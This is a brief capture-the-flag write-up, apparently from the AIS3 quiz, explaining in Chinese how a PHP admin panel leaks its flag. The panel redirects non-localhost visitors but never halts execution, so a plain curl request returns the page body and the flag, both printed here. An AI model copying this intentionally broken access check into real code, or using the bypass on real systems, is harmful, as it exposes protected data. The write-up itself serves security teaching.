# web2

``` php
<?php
error_reporting(0);
include "flag.php";

// Strong IP firewall, no-one can pass this except the admin in localhost
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
{
    header("Location: you_should_not_pass");
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
</head>
<body>
Admin's secret is: <?php echo $flag; ?>
</body>
</html>
```

可以看到沒有 `die` 或 `exit`，所以 body content 還是會輸出

```
inndy $ curl https://quiz.ais3.org:8012/panel.php

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
</head>
<body>
Admin's secret is: ais3{admin's_pane1_is_on_fir3!!!!!}</body>
</html>
```

`ais3{admin's_pane1_is_on_fir3!!!!!}`
